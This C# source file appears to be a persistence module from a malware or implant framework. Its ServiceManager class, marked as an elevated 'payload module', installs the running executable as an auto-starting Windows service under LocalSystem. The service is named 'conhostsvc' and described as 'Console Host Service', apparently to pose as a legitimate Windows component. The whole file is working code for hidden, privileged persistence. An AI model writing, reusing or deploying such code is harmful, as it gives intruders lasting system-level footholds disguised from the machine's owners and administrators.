using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration.Install;
using System.Linq;
using System.Reflection;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;

namespace zort
{
    [RunInstaller(true)]
    public class ServiceInstaller : Installer
    {

        private readonly System.ServiceProcess.ServiceInstaller serviceInstaller;
        private readonly ServiceProcessInstaller processInstaller;

        public ServiceInstaller()
        {
            serviceInstaller = new System.ServiceProcess.ServiceInstaller();
            processInstaller = new ServiceProcessInstaller
            {
                Account = ServiceAccount.LocalSystem
            };

            serviceInstaller.StartType = ServiceStartMode.Automatic;
            serviceInstaller.ServiceName = "conhostsvc";
            serviceInstaller.DisplayName = "Console Host Service";
            serviceInstaller.Description = "Provides console hosting capabilities for applications requiring background processing.";
            Installers.Add(serviceInstaller);
            Installers.Add(processInstaller);
        }
    }

    public class ServiceManager : IPayloadModule
    {
        const bool DEBUG_REINSTALL = true;

        public ElevationType ElevationType => ElevationType.Elevated;

        public string ModuleName => "ServiceManager";

        public void Start()
        {
            //check if we are running as a service
            if (!Environment.UserInteractive)
            {
                ModuleLogger.Log(this, "Running in service mode. no need to install service. Exiting...");
                return;
            }

            // Check if the service is already installed
            var serviceName = "conhostsvc";
            var service = ServiceController.GetServices().FirstOrDefault(s => s.ServiceName == serviceName);
            if (service != null)
            {
                if (DEBUG_REINSTALL)
                {
                    ModuleLogger.Log(this, "DEBUG: Service is already installed. Reinstalling...");
                    // Uninstall the service
                    ModuleLogger.Log(this, "Stopping service...");
                    using (var sc = new ServiceController(serviceName))
                    {
                        if (sc.Status != ServiceControllerStatus.Stopped)
                        {
                            sc.Stop();
                            sc.WaitForStatus(ServiceControllerStatus.Stopped);
                        }
                    }
                    ModuleLogger.Log(this, "Uninstalling service...");
                    ManagedInstallerClass.InstallHelper(new string[] { "/u", Assembly.GetExecutingAssembly().Location });
                }
                else
                {
                    ModuleLogger.Log(this, "Service is already installed.");
                    return;
                }
            }

            // Install the service
            ModuleLogger.Log(this, "Starting service installation...");
            ManagedInstallerClass.InstallHelper(new string[] { Assembly.GetExecutingAssembly().Location });
        }

        public void Stop()
        {
            //Dont do anything. this runs only once therefore does not need to be stopped
        }
    }
}
